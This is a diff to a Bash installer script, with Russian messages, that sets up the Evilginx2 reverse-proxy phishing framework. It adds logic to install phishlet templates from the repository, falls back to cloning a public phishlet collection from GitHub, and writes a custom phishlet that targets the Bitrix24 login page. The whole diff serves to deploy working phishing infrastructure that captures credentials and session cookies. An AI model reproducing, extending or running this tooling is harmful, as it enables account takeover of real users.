@@ -176,29 +176,40 @@ create_directories() {
     success "Рабочие директории созданы в /root/evilginx2-data/"
 }
 
-# Загрузка популярных phishlets
-download_phishlets() {
-    log "Загрузка популярных phishlets..."
+# Установка phishlets из репозитория
+install_phishlets() {
+    log "Установка phishlets из репозитория..."
     
-    # Скачать коллекцию An0nUD4Y
-    cd /tmp
-    if git clone https://github.com/An0nUD4Y/Evilginx2-Phishlets.git 2>/dev/null; then
-        # Копировать все phishlets
-        cp /tmp/Evilginx2-Phishlets/*.yaml /root/evilginx2-data/phishlets/ 2>/dev/null || true
+    # Определить директорию скрипта
+    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+    
+    # Проверить наличие директории phishlets в репозитории
+    if [[ -d "$SCRIPT_DIR/phishlets" ]]; then
+        # Копировать все phishlets из репозитория
+        cp "$SCRIPT_DIR/phishlets/"*.yaml /root/evilginx2-data/phishlets/ 2>/dev/null || true
         
-        # Очистить временную директорию
-        rm -rf /tmp/Evilginx2-Phishlets
-        
-        success "Популярные phishlets загружены"
+        success "Phishlets из репозитория установлены"
     else
-        warning "Не удалось загрузить phishlets. Проверьте интернет-соединение."
+        warning "Директория phishlets не найдена в репозитории"
+        
+        # Fallback: попытаться скачать из интернета
+        log "Попытка загрузки phishlets из интернета..."
+        cd /tmp
+        if git clone https://github.com/An0nUD4Y/Evilginx2-Phishlets.git 2>/dev/null; then
+            cp /tmp/Evilginx2-Phishlets/*.yaml /root/evilginx2-data/phishlets/ 2>/dev/null || true
+            rm -rf /tmp/Evilginx2-Phishlets
+            success "Phishlets загружены из интернета"
+        else
+            warning "Не удалось загрузить phishlets. Создаем только базовые."
+        fi
     fi
     
-    # Создать кастомные phishlets
-    log "Создание кастомных Bitrix24 phishlets..."
-    
-    # Bitrix24 Universal phishlet
-    cat > /root/evilginx2-data/phishlets/bitrix24-universal.yaml << 'EOF'
+    # Проверить, есть ли уже Bitrix24 phishlets в репозитории
+    if [[ ! -f "/root/evilginx2-data/phishlets/bitrix24-universal.yaml" ]]; then
+        log "Создание дополнительных кастомных phishlets..."
+        
+        # Bitrix24 Universal phishlet (только если его еще нет)
+        cat > /root/evilginx2-data/phishlets/bitrix24-universal.yaml << 'EOF'
 author: 'AKUMA-EvilGinx2-AutoInstaller'
 min_ver: '3.0.0'
 proxy_hosts:
@@ -224,8 +235,8 @@ login:
   domain: '{target_domain}'
   path: '/index.php?login=yes'
 EOF
-
-    success "Кастомные phishlets созданы"
+        success "Дополнительные phishlets созданы"
+    fi
     
     # Подсчитать количество
     phishlets_count=$(ls -1 /root/evilginx2-data/phishlets/*.yaml 2>/dev/null | wc -l)
@@ -312,7 +323,7 @@ main() {
     compile_evilginx
     install_binary
     create_directories
-    download_phishlets
+    install_phishlets
     create_service
     final_check
     show_usage_info
